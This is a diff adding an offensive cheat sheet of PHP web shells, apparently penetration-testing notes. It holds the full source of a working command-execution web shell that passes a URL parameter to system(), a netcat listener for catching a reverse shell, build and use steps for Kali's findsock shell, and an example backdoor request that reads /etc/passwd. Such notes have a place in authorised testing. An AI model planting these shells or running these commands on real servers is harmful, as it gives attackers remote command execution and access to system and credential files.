@@ -1,0 +1,48 @@
+
+---------------------PHP SHELL-----------------------
+
+<?
+//
+// PHP_KIT
+//
+// cmd.php = Command Execution
+//
+// by: The Dark Raver
+// modified: 21/01/2004
+//
+?>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+  }
+?>
+</pre>
+</BODY></HTML>
+
+---------------------PENTESTMONEKY PHP SHELL-----------------------
+
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+$ nc -v -n -l -p 1234
+
+---------------------PHP SHELL IN KALI-----------------------
+
+Pen Test Monkey - PHP Reverse Shell:
+- /usr/share/webshells/php/php-reverse-shell.php
+
+Pen Test Monkey, Findsock Shell. Build gcc -o findsock findsock.c (be mindfull of the target servers architecture), execute 
+with netcat not a browser nc -v target 80:
+- /usr/share/webshells/php/php-findsock-shell.php
+- /usr/share/webshells/php/findsock.c
+
+- PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: 
+- http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+- /usr/share/webshells/php/simple-backdoor.php 
+
+ Larger PHP shell, with a text input box for command execution:
+- /usr/share/webshells/php/php-backdoor.php
